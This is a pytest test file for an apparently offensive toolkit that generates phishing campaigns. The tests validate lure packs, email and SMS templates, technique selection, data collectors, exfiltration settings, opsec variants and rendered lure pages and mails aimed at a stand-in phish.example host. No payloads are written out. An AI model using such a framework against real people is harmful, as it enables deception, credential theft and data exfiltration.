def test_gui_html_wires_live_stream():
    from cf.gui import GUI_HTML

    html = GUI_HTML.read_text(encoding="utf-8")
    assert "EventSource" in html
    assert "/api/events" in html
    assert "/status" in html


# ─── category packs / generator (framework v1) ───


def test_every_pack_validates():
    import string

    from cf.collect import COLLECTORS, EXFIL
    from cf.generator import CTX_KEYS, builtin_chains, list_packs, load_pack
    from cf.lure import SCENARIOS
    from cf.techniques import TECHNIQUES

    packs = list_packs()
    assert len(packs) >= 6
    assert len(set(packs)) == len(packs)
    surfaces = {t.surface for t in TECHNIQUES.values()}
    tags = {tg for t in TECHNIQUES.values() for tg in t.tags}
    chains = builtin_chains()
    seen_ids: set[str] = set()
    for pid in packs:
        spec = load_pack(pid)
        assert spec["id"] == pid
        assert pid not in seen_ids
        seen_ids.add(pid)
        assert spec["scenarios"]
        assert all(s in SCENARIOS for s in spec["scenarios"])
        assert "email" in spec["channels"]
        for tpl in spec["channels"].values():
            assert tpl.get("body")
            for field_name in ("subject", "body"):
                raw = tpl.get(field_name)
                if not raw:
                    continue
                for _, field, _, _ in string.Formatter().parse(str(raw)):
                    if field:
                        root = field.split(".")[0].split("[")[0]
                        assert root in CTX_KEYS, (pid, field)
        for s in spec["techniques"]["surfaces"]:
            assert s in surfaces
        for tg in spec["techniques"]["prefer_tags"]:
            assert tg in tags
        for tid in spec["techniques"]["avoid"]:
            assert tid in TECHNIQUES
        assert 1 <= spec["techniques"]["min_reliability"] <= 5
        for kind in spec["payload"]["collect"]:
            assert kind in COLLECTORS
        assert spec["payload"]["exfil"] in EXFIL
        assert 0 <= spec["payload"]["jitter"] <= 0.9
        assert 1 <= spec["opsec"]["variant_count"] <= 10
        for eid in spec["exploits"]:
            assert eid in chains


def test_select_techniques_follows_pack_rules():
    from cf.generator import list_packs, load_pack, select_techniques

    for pid in list_packs():
        pack = load_pack(pid)
        rules = pack["techniques"]
        selected = select_techniques(pack)
        assert selected, pid
        for tech in selected:
            assert tech.id not in rules["avoid"]
            if rules["surfaces"]:
                assert tech.surface in rules["surfaces"]
            assert tech.reliability >= rules["min_reliability"]


def test_generate_is_deterministic_and_seed_sensitive():
    from cf.generator import generate

    a = generate("colis", seed=7)
    b = generate("colis", seed=7)
    assert a == b
    c = generate("colis", seed=8)
    assert [v["token"] for v in a["variants"]] != [v["token"] for v in c["variants"]]
    for v in a["variants"]:
        assert v["command"] and v["body"]
        assert "{" not in v["body"]
        if v["subject"]:
            assert "{" not in v["subject"]
    assert a["payload"]["chain"]["primitives"]
    assert a["exploits"]
    assert all(e["command"] and "{" not in e["command"] for e in a["exploits"])


def test_generate_channel_and_bounds():
    from cf.generator import generate

    sms = generate("colis", channel="sms", seed=1)
    assert sms["channel"] == "sms"
    with pytest.raises(ValueError, match="channel"):
        generate("cloudflare", channel="sms")
    with pytest.raises(ValueError, match="1..10"):
        generate("colis", variants=99)
    assert len(generate("colis", variants=1)["variants"]) == 1
    with pytest.raises(FileNotFoundError):
        generate("no-such-pack")


def test_cli_generate_list_and_json(capsys):
    import json

    from cf.cli import Cli

    assert Cli(["generate", "list"]).run() == 0
    listed = capsys.readouterr().out.split()
    assert "colis" in listed
    assert "crypto" in listed

    assert Cli(["generate", "crypto", "--seed", "3"]).run() == 0
    bundle = json.loads(capsys.readouterr().out)
    assert bundle["pack"] == "crypto"
    assert bundle["variants"]
    assert bundle["techniques"]


def test_cli_generate_unknown_pack_exits():
    from cf.cli import Cli

    assert Cli(["generate", "no-such-pack"]).run() == 1


def test_write_bundle_renders_lures(tmp_path):
    import json

    from cf.generator import generate, write_bundle

    bundle = generate("update", seed=5, base_url="https://phish.example")
    written = write_bundle(bundle, tmp_path / "out")
    assert set(written) == {
        "bundle.json",
        "lure-1.html",
        "lure-2.html",
        "lure-3.html",
        "mail-1.eml",
        "mail-2.eml",
        "mail-3.eml",
    }
    html = (tmp_path / "out" / "lure-1.html").read_text(encoding="utf-8")
    assert "</html>" in html
    on_disk = json.loads(
        (tmp_path / "out" / "bundle.json").read_text(encoding="utf-8")
    )
    assert on_disk["pack"] == "update"
    assert on_disk["variants"][0]["command"]
